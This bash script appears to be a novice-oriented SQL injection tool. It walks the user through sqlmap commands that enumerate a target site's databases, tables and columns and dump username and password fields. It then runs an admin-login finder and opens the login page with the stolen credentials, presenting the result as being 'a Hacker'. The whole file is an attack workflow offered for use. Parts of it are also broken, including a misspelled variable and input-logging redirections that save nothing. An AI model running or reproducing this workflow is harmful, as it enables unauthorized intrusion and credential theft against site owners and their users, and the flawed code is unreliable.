#!/bin/bash

sleep 1

clear

echo -e "Type \e[92m\`\e[93mhelp\e[92m\` for more Info\e[93m.\e[0m"
while [ 1 ]
do
echo -ne "CMD \e[96m>\e[0m "; read Command >> Save.txt

if [ "${Command}" == "help" ]
then
clear
xdg-open ../README.md
exit
elif [ "${Command}" == "clear" ]
then
clear
elif [ "${Command}" == "x" ] || [ "${Command}" == "X" ] || [ "${Command}" == "exit" ]
then
exit
elif [ "${Command}" == "go" ]
then
clear
echo -ne "Enter Address \e[96m>\e[0m "; read Address >> Save.txt
echo ""
echo -ne "Enter Domain Name \e[96m>\e[0m "; read Namespace >> Save.txt
sleep 1
sqlmap -u $Address --dbs
echo -ne "Enter [\e[93m1\e[0m] of Databases Namespace \e[96m>\e[0m "; read Dame >> Save.txt
sqlmap -u $Addreass -D $Dame --tables
echo -ne "Enter [\e[93m1\e[0m] of Databases [\e[93mTables\e[0m] Namespace \e[96m>\e[0m "; read Table >> Save.txt
sqlmap -u $Address -D $Dame -T $Table --columns
echo -ne "Enter [\e[93mUsername\e[0m] or [\e[93mUname\e[0m] or [\e[93mUser\e[0m] or [\e[93mUN\e[0m] \e[96m>\e[0m "; read Username >> Save.txt
echo ""
echo -ne "Enter [\e[93mPassword\e[0m] or [\e[93mPassw\e[0m] or [\e[93mPass\e[0m] or [\e[93mPW\e[0m] \e[96m>\e[0m "; read Password >> Save.txt
sqlmap -u $Address -D $Dame -T $Table -C $Username,$Password --dump
echo -e "Right, Now Type $Address in The [\e[93m->\e[0m]!"
sleep 5
echo ""
echo -e "Then Enter [\e[93m1\e[0m] for [\e[95mPHP\e[0m]."
sleep 5
echo ""
echo -e "Go\e[93m!\e[0m"
sleep 5
clear
echo ""
perl ADF.pl
echo -ne "Now type the [\e[93m+\e[0m] Found Login Address \e[96m>\e[0m "; read Address >> Save.txt
sleep 5
echo ""
echo -e "Then Type the Username and Password in The Hostsite, and \e[93mCongratulations!\e[0m you Are a \e[93mHacker!\e[0m.."
xdg-open $Address
else
echo ""
echo -e "\e[93mSorry,\e[0m Command not Found."
echo ""
fi
done
